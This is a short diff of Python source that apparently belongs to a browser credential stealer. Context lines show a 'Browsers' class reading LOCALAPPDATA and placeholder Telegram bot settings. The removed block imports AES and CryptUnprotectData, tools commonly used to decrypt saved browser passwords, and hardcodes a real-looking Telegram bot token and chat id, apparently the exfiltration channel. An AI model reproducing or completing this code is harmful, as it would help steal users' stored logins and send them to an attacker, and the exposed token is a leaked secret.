@@ -28,23 +28,6 @@ from concurrent.futures import ThreadPoolExecutor
 bot_token = 'TOKEN'
 chat_id = 'ID'
 
-
-import os
-import shutil
-import zipfile
-import requests
-from typing import Union
-import base64
-import json
-import random
-import sqlite3
-import threading
-from Crypto.Cipher import AES
-from win32crypt import CryptUnprotectData
-
-bot_token = '7481960829:AAFWLAti2xagba2MyBWDHBTChsR3__Ks2gM'
-chat_id = '-1002159253602'
-
 class Browsers:
     def __init__(self):
         self.appdata = os.getenv('LOCALAPPDATA')
